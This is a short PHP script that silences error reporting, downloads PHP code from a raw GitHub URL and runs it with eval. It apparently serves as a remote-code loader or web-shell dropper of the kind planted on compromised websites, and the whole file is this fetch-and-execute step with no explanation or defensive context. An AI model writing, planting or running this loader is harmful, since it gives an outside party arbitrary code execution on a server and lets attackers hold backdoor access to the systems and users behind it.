<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/kontol-svg/cobaajabang/refs/heads/main/cibai.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
